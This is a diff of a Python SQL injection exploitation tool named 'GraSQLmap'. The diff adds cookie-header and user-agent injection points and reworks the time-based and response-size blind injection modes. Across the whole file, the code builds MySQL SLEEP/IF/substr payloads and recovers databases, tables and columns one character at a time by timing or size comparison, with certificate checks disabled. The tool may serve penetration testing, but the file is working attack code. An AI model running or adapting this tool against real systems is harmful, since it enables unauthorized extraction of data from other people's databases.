@@ -4,8 +4,11 @@ import sys
 from datetime import datetime
 import argparse
 from tabulate import tabulate
+import keyboard
 
-MODE = 1
+SQLI_TYPE = ['TIME', 'ERROR']
+TIME_BSD = 0
+ERROR_BSD = 1
 
 METHODS = ['GET', 'POST']
 GET 	= 0
@@ -15,9 +18,10 @@ GETMETHODS = ['GETPARAM', 'GETSTRING', 'GETDIRECT']
 GET_PARAM = 0
 GET_STRING = 1
 GET_DIRECT = 2
-POSTMETHODS = ['POSTDATA', 'USERAGENT']
+POSTMETHODS = ['POSTDATA', 'USERAGENT', 'COOKIEMOD']
 POST_DATA = 0
 USER_AGENT = 1
+COOKIE_MOD = 2
 
 QUOTE_TYPES		= ['', "\'", '\"'] #, '\´', '\`']
 NO_QUOTE		= 0
@@ -86,10 +90,11 @@ defaultdb = ''
 tablename = ''
 pvUserAgentData = ''
 
+keyCmd = ''
 verbVar = logInfo #logAll
 dSec = 1
 defDBt = False
-sqliType = 1
+sqliType = 0
 limitSize = 0
 
 method = METHODS[GET]
@@ -110,6 +115,7 @@ proxyDict = {
               "https" : https_proxy
             }
 defUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
+useUserAgent = defUserAgent
 
 payloadHead1 = "(SELECT 4978 FROM (SELECT(SLEEP(IF("
 payloadHead2 = "(SELECT 4978 FROM (SELECT(SLEEP(IF(ascii(substr("
@@ -178,9 +184,14 @@ def setPayload(pData):
             svData = svData+restVar
             logki(logAll,svData)
         if subMethod == POSTMETHODS[USER_AGENT]:
-            payload_str = defUserAgent+preVar+pData+restVar
+            payload_str = useUserAgent+preVar+pData+restVar
             logki(logAll,payload_str)
             setHeader(sutike, payload_str)
+            svData = pvUserAgentData
+        if subMethod == POSTMETHODS[COOKIE_MOD]:
+            payload_str = sutike+preVar+pData+restVar
+            logki(logAll,payload_str)
+            setHeader(payload_str, useUserAgent)
             svData = pvUserAgentData
     return svData
 
@@ -193,9 +204,9 @@ def digitFind_sqliType(forWhat):
     for y in range(0,3+1):
         hatv = 10 ** y
         data = ''
-        if sqliType == 1:
+        if sqliType == 0:
             data = payloadHead1+"("+forWhat+")<"+str(hatv)+","+str(dSec)+",0"+payloadTail1
-        elif sqliType == 2:
+        elif sqliType == 1:
             data = "(("+forWhat+")<"+str(hatv)+payloadTail4
         data = setPayload(data)
         tstart = datetime.now()
@@ -216,10 +227,10 @@ def digitFind_sqliType(forWhat):
         tdelta = int(delta.total_seconds() * 1000 )
         rSize = len(response.content)
         logki(logTrace,"RespSize: "+str(rSize)+"kb Resp: "+str(response.elapsed.total_seconds())+"s Calc:"+str(tdelta/1000)+"s - Limit: "+str(dSec)+"s")
-        if (sqliType == 1) and ((response.elapsed.total_seconds() >= dSec) or (tdelta >= dSec*1000)):
+        if (sqliType == 0) and ((response.elapsed.total_seconds() >= dSec) or (tdelta >= dSec*1000)):
             result = y
             break
-        elif (sqliType == 2) and (rSize > limitSize):
+        elif (sqliType == 1) and (rSize > limitSize):
             result = y
             break
     return result
@@ -234,9 +245,9 @@ def lenFind_sqliType(forWhat):
     logki(logTrace,"Digits: "+str(digN))
     for y in range(1,digN+1):
         for x in range(NrMin,NrMax+1):
-            if sqliType == 1:
+            if sqliType == 0:
                 data = payloadHead2+"("+forWhat+"),"+str(y)+",1))<>"+str(x)+",0,"+str(dSec)+payloadTail1
-            elif sqliType == 2:
+            elif sqliType == 1:
                 data = payloadHead4+"("+forWhat+"),"+str(y)+",1))="+str(x)+payloadTail4
             data = setPayload(data)
             tstart = datetime.now()
@@ -257,15 +268,26 @@ def lenFind_sqliType(forWhat):
             tdelta = int(delta.total_seconds() * 1000 )
             rSize = len(response.content)
             logki(logTrace,"RespSize: "+str(rSize)+"kb Resp: "+str(response.elapsed.total_seconds())+"s Calc:"+str(tdelta/1000)+"s - Limit: "+str(dSec)+"s")
-            if (sqliType == 1) and ((response.elapsed.total_seconds() >= dSec) or (tdelta >= dSec*1000)):
+            if (sqliType == 0) and ((response.elapsed.total_seconds() >= dSec) or (tdelta >= dSec*1000)):
                 result = result + chr(x)
                 break
-            elif (sqliType == 2) and (rSize > limitSize):
+            elif (sqliType == 1) and (rSize > limitSize):
                 result = result + chr(x)
                 break
     return result
 
+def keyStroke(key):
+    global keyCmd
+    if key == 'Q':
+        keyCmd = 'QUIT'
+
 def testRun():
+    global subMethod
+    global keyCmd
+    global sutike
+    subMethod = 'tests...'
+    runparams()
+    response = ''
     tries = 0
     payloadParams = []
     logki(logTrace,"[testRun]")
@@ -274,15 +296,23 @@ def testRun():
     findN = 0
     mszer = 1
     if method == 'GET':
-        mszer = 3
+        mszer = len(GETMETHODS)
+    if method == 'POST':
+        mszer = len(POSTMETHODS)
     if verbVar >= logTrace:
         print(QUOTE_TYPES)
         print(SPACES)
         print(USE_SUFFIXES)
         runparams()
+    #keyboard.add_hotkey('q', lambda: keyStroke('Q'))
+    #keyboard.add_hotkey('Q', lambda: keyStroke('Q'))
     allTries = mszer * len(mode1payloadPfx) * len(mode1payloadSuf) * len(QUOTE_TYPES) * len(SPACES) * len(USE_SUFFIXES)
     for gethdik in range(0, mszer):
         if result: break
+        if method == 'GET':
+            subMethod = GETMETHODS[gethdik]
+        if method == 'POST':
+            subMethod = POSTMETHODS[gethdik]
         #logki(logInfo,'[hdik] - ['+str(gethdik)+']')
         for sufF in USE_SUFFIXES:
             if result: break
@@ -311,15 +341,22 @@ def testRun():
                                 #parameters = {'option' : 'com_fields', 'view' : 'fields', 'layout' : 'modal' , 'list[fullordering]' : data}
                                 payload_str = "&".join("%s=%s" % (k,v) for k,v in parameters.items())
                                 #logki(logAll,payload_str)
-                            if method == 'POST':
+                            if method == 'POST' and not(method == 'POST'):
                                 data = preVar+data
                                 data = data.replace(' ', spcF)
                                 data = data+restVar
                                 payload_str = data
-                            if method == 'USERAGENT':
-                                payload_str = defUserAgent+data
+                            if method == 'POST' and subMethod == POSTMETHODS[USER_AGENT]:
+                                payload_str = useUserAgent+data
                                 logki(logAll,payload_str)
                                 setHeader(sutike, payload_str)
+                                data = preVar + restVar
+                            if method == 'POST' and subMethod == POSTMETHODS[COOKIE_MOD]:
+                                if sutike == '' or sutike[0] == ' ':
+                                    sutike = 'C' + sutike
+                                payload_str = sutike+data
+                                logki(logAll,payload_str)
+                                setHeader(payload_str, useUserAgent)
                                 data = preVar + restVar
                             logki(logAll,data)
                             tstart = datetime.now()
@@ -335,21 +372,24 @@ def testRun():
                                     logki(logAll,dUrl)
                                     response = requests.get(dUrl, params=parameters)
                             if method == 'POST':
-                                response = requests.post(pURL, proxies=proxyDict, headers=headers, cookies=cookies, data=data, verify=False)
-                            if method == 'USERAGENT':
-                                logki(logAll,pvUserAgentData)
-                                response = requests.post(pURL, proxies=proxyDict, headers=headers, cookies=cookies, data=pvUserAgentData, verify=False)
+                                if subMethod == POSTMETHODS[USER_AGENT] or subMethod == POSTMETHODS[COOKIE_MOD]:
+                                    logki(logAll,pvUserAgentData)
+                                    response = requests.post(pURL, proxies=proxyDict, headers=headers, cookies=cookies, data=pvUserAgentData, verify=False)
+                                else:
+                                    response = requests.post(pURL, proxies=proxyDict, headers=headers, cookies=cookies, data=data, verify=False)
                             logki(logTrace,response.url)
                             tend = datetime.now()
                             delta = tend - tstart
                             tdelta = int(delta.total_seconds() * 1000 )
                             logki(logAll,"Resp: "+str(response.elapsed.total_seconds())+"s Calc:"+str(tdelta/1000)+"s - Limit: "+str(dSec)+"s")
-                            sys.stdout.write("[ Round "+str(gethdik+1)+" / "+str(mszer)+" - Try #"+str(tries)+" / "+str(allTries)+" - Hit "+str(findN)+" ]\r")
+                            sys.stdout.write("[ Round "+str(gethdik+1)+" / "+str(mszer)+" ["+subMethod+"] - Try #"+str(tries)+" / "+str(allTries)+" - Hit "+str(findN)+" ]\r") # - Press 'q' to stop
                             sys.stdout.flush()
+                            if keyCmd == 'QUIT':
+                                result = True
                             if (response.elapsed.total_seconds() >= dSec) or (tdelta >= dSec*1000):
                                 findN += 1
                                 payloadFinding.append(str(findN))
-                                payloadFinding.append(str(gethdik+1))
+                                payloadFinding.append(subMethod)
                                 payloadFinding.append('['+qt+']')
                                 payloadFinding.append('['+mpP+']')
                                 payloadFinding.append('['+spcF+']')
@@ -396,10 +436,10 @@ def charFind_sqliType(forWhat, whatLen):
             x = int(rangeMin + ((rangeMax - rangeMin) / 2))
             data = ''
             logki(logAll,"calc: "+str(rangeMin)+" - "+str(x)+" - "+str(rangeMax))
-            if sqliType == 1:
+            if sqliType == 0:
                 #data = payloadHead2+"("+forWhat+"),"+str(y)+",1))>"+str(x)+",0,"+str(dSec)+payloadTail1
                 data = payloadHead2+"("+forWhat+"),"+str(y)+",1))>"+str(x)+","+str(dSec)+",0"+payloadTail1
-            elif sqliType == 2:
+            elif sqliType == 1:
                 data = payloadHead4+"("+forWhat+"),"+str(y)+",1))>"+str(x)+payloadTail4
             data = setPayload(data)
             tstart = datetime.now()
@@ -420,14 +460,14 @@ def charFind_sqliType(forWhat, whatLen):
             tdelta = int(delta.total_seconds() * 1000 )
             rSize = len(response.content)
             logki(logTrace,"RespSize: "+str(rSize)+"kb Resp: "+str(response.elapsed.total_seconds())+"s Calc:"+str(tdelta/1000)+"s - Limit: "+str(dSec)+"s")
-            if sqliType == 1:
+            if sqliType == 0:
                 if (response.elapsed.total_seconds() >= dSec) or (tdelta >= dSec*1000):
                     rangeMin = x
                     logki(logAll,"x --> rMin: "+str(x))
                 else:
                     rangeMax = x
                     logki(logAll,"x --> rMax: "+str(x))
-            elif sqliType == 2:
+            elif sqliType == 1:
                 if rSize > limitSize:
                     rangeMin = x
                     logki(logAll,"x --> rMin: "+str(x))
@@ -437,9 +477,9 @@ def charFind_sqliType(forWhat, whatLen):
             if rangeMax - rangeMin <= 3:
                 for f in range(rangeMin-1,rangeMax+1):
                     logki(logAll,"calcBL: "+str(rangeMin)+" - "+str(f)+" - "+str(rangeMax))
-                    if sqliType == 1:
+                    if sqliType == 0:
                         data = payloadHead2+"("+forWhat+"),"+str(y)+",1))<>"+str(f)+",0,"+str(dSec)+payloadTail1
-                    elif sqliType == 2:
+                    elif sqliType == 1:
                         data = payloadHead4+"("+forWhat+"),"+str(y)+",1))="+str(f)+payloadTail4
                     data = setPayload(data)
                     tstart = datetime.now()
@@ -461,10 +501,10 @@ def charFind_sqliType(forWhat, whatLen):
                     rSize = len(response.content)
                     logki(logTrace,"RespSize: "+str(rSize)+"kb Resp: "+str(response.elapsed.total_seconds())+"s Calc:"+str(tdelta/1000)+"s - Limit: "+str(dSec)+"s")
                     melyikAg = False
-                    if sqliType == 1:
+                    if sqliType == 0:
                         if (response.elapsed.total_seconds() >= dSec) or (tdelta >= dSec*1000):
                             melyikAg = True
-                    elif sqliType == 2:
+                    elif sqliType == 1:
                         if rSize > limitSize:
                             melyikAg = True
                     if melyikAg:
@@ -763,24 +803,30 @@ def column_q(): #lekérdezett vagy megadott tábla alapján mező lekérdezések
     print('---')
 
 def runparams():
-    global verbVar
-    global pURL
-    global method
-    global defDBt
-    global inSpace
+    #global verbVar
+    #global pURL
+    #global method
+    #global defDBt
+    #global inSpace
     print("Verbose level ["+logLevels[verbVar]+"]")
     print("URL           ["+pURL+"]")
-    print("Metódus       ["+method+"]")
-    print("Almetódus     ["+subMethod+"]")
-    print("Force defDB   ["+str(defDBt)+"]")
-    print("Space         ["+inSpace+"]")
-    logki(logDebug,"ParamV        ["+preVar+"]")
+    print("Method        ["+method+"]")
+    print("Submethod     ["+subMethod+"]")
+    print("SQLi type     ["+SQLI_TYPE[sqliType]+"]")
+    #print("URL           ["+pURL+"]")
+    logki(logDebug,"Cookie        ["+sutike+"]")
+    logki(logDebug,"User-Agent    ["+useUserAgent+"]")
+    logki(logDebug,"Force defDB   ["+str(defDBt)+"]")
+    logki(logDebug,"Space         ["+inSpace+"]")
+    logki(logDebug,"ParamHead     ["+preVar+"]")
     logki(logDebug,"ParamLeft     ["+paramLeft+"]")
     logki(logDebug,"ParamRight    ["+paramRight+"]")
+    logki(logDebug,"ParamTail     ["+restVar+"]")
     logki(logDebug,"UserAgentData ["+pvUserAgentData+"]")
 
 def main():
     global sutike
+    global useUserAgent
     dispDeltaStart('szo')
     print(' --< GraSQLmap ]--[ ')
 
@@ -788,7 +834,7 @@ def main():
     parser.add_argument("-u","--url",help="Input an url.",type=str)
     parser.add_argument("-up","--url_port",help="Input a portnumber for url (default = 80).",type=int)
     parser.add_argument("-m","--method",help="Call method. (default = GET )",type=str)
-    parser.add_argument("-sm","--sub_method",help="Call sub method. (default = simple GET 1 )",type=int)
+    parser.add_argument("-sm","--sub_method",help="Call sub method. (GET [default 0 - GETPARAM, 1 - GETSTRING, 2 - GETDIRECT]; POST [default 0 - POSTDATA, 1 - USERAGENT, 2 - COOKIEMOD])",type=int)
     parser.add_argument("--ssl",action='store_true')
     parser.add_argument("-p","--proxy_http",help="Input a http proxy",type=str)
     parser.add_argument("-ps","--proxy_https",help="Input a https proxy",type=str)
@@ -813,6 +859,7 @@ def main():
     parser.add_argument("-pt","--paramstail",help="Paramter/Payloadstring after payload.",type=str)
     parser.add_argument("-uad","--useragent_data",help="In case Useragent method, POST data.",type=str)
     parser.add_argument("-ck","--cookie",help="Cookie value.",type=str)
+    parser.add_argument("-uag","--user_agent",help="User-Agent value.",type=str)
 
     if len(sys.argv) == 1:
         parser.print_help()
@@ -871,11 +918,11 @@ def main():
             limitSize=args.response_size
     if(args.sqli_type):
             sqliType=args.sqli_type
-            if sqliType < 1:
+            if sqliType < 0:
+                sqliType = 0
+            if sqliType > 1:
                 sqliType = 1
-            if sqliType > 2:
-                sqliType = 2
-            if(sqliType == 2):
+            if(sqliType == 1):
                 if not(args.response_size):
                    print("For -st (sqli_type) 2, You must input response size limit -rs (response_size)!")
                    canGo = False
@@ -912,6 +959,8 @@ def main():
                     inSpace=args.space
             if(args.cookie):
                     sutike=args.cookie
+            if(args.user_agent):
+                    useUserAgent=args.user_agent
             if(args.dirfile):
                     urlEnd=args.dirfile
             if(args.paramshead):
@@ -927,7 +976,7 @@ def main():
             #print(urlVar)
             pURL = urlVar+urlEnd
             logki(logTrace,'Cookie: '+sutike)
-            setHeader(sutike, defUserAgent)
+            setHeader(sutike, useUserAgent)
 
             if(args.dbs==None and args.databases==None and args.tables==None):
                     print("Missing parameters, use --help or --test, --info, --dbs switches.")
